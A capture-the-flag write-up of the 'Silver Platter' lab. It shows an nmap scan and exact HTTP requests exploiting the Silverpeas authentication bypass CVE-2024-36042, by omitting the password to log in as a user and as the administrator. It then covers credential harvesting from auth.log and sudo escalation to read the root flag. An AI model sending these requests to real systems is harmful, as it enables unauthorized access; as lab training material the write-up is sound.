# Silver Platter Write-up | 报告

This is my write-up for the Silver Platter room. This is a CTF challenge where we will dive into the web server to find hidden flags via SSH.

We have to find user's flag and root's flag.

## Reconnaissance

After getting an IP address, I scanned it to search for open ports using Nmap tool:

```
nmap -sC -sV MACHINE_IP
```

We got three open ports: **22** (SSH), **80** (HTTP), **8080** (HTTP-PROXY). Let's see the web server:

`http://MACHINE_IP:80` or just `http://MACHINE_IP`

It's company's site where we can read 4 tabs: "Intro", "Work", "About" and "Contact".

The most interesting tab is "Contact". Now we know that there's "scr1ptkiddy" username on **Silverpeas** service.

Then I checked port 8080:

`http://MACHINE_IP:8080`

It returns us an error. But it doesn't mean that there is nothing more. We know about Silverpeas service, let's see if port 8080 handles it:

`http://MACHINE_IP:8080/silverpeas`

We're being redirected to login page! I immediately noticed the "Give me a new password" button and used it with "scr1ptkiddy" username, but it didn't give any help or tip.

The only thing we know is that "scr1ptkiddy" username is on Silverpeas. Nothing more. We have to find the vulnerability of this service, that can help us continue.

## Exploitation

I googled "silverpeas vulnerabilities" and found **CVE-2024-36042 "Silverpeas authentication bypass"**. This is exactly what we need, because we have username, and this CVE lets us log in without password.

### CVE-2024-36042 Description:
Silverpeas before 6.3.5 allows authentication bypass by omitting the Password field to AuthenticationServlet, often providing an unauthenticated user with superadmin access.

This is perfect. Let's open Burp Suite and go to `http://MACHINE_IP:8080/silverpeas`, then type "scr1ptkiddy" username and press "LOG IN" with **intercept on**, so we can capture our request and try the vulnerability.

```
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.48.175.44:8080
Origin: http://10.48.175.44:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Referer: http://10.48.175.44:8080/silverpeas/defaultLogin.jsp

Login=scr1ptkiddy&Password=&DomainId=0
```

We need to **remove password field at the end of the request** like this:

```
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.48.175.44:8080
Origin: http://10.48.175.44:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Referer: http://10.48.175.44:8080/silverpeas/defaultLogin.jsp

Login=scr1ptkiddy&DomainId=0
```

And send it. Then turn the intercept off.

We're now logged in as scr1ptkiddy on Silverpeas.

In "**Directory**" tab we have three cards of users: scr1ptkiddy, Manager and Administrator. Here we can see Administrator's local user: `silveradmin@localhost`.

I checked all the directories and messages but didn't find anything helpful. Now we need to log out and try to log in as Silver Admin:

```
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.48.175.44:8080
Origin: http://10.48.175.44:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Referer: http://10.48.175.44:8080/silverpeas/defaultLogin.jsp

Login=SilverAdmin&DomainId=0
```
(**Do not use space in username field**)

Now we're logged in as Administrator. Let's check messages... In "Mes notifications", in "Notifications envoyées" tab we see message with "SSH" header.

It gives us a username and password for SSH. Let's dive into it.

```
ssh tim@MACHINE_IP
```

Then copy n paste the password.

Now, when we're in, in `/home/tim` type `ls` to find `user.txt`. This is user's flag.

After that I found other users, such as "tyler", "ssm-user", "ubuntu", tried to move to their directories, but I don't have permissions.

We also can search for logs, which can be really useful. Type  `ls /var/log`:

`auth.log` files are the most interesting ones. Let's open all of them.

`auth.log.2` contains tyler's user password in DB_PASSWORD field. Let's change to tyler, type: `su tyler` and copy n paste the password we found.

Let's check tyler's permissions by running `sudo -l`:

The `(ALL : ALL) ALL` line means we have full administrative privileges. We can read any file. Let's look for root's flag:

```
sudo cat /root/root.txt
```

The output reveals root's flag.

## Conclusion

In this room, I learned how to:
* Search for **CVE vulnerabilities**.
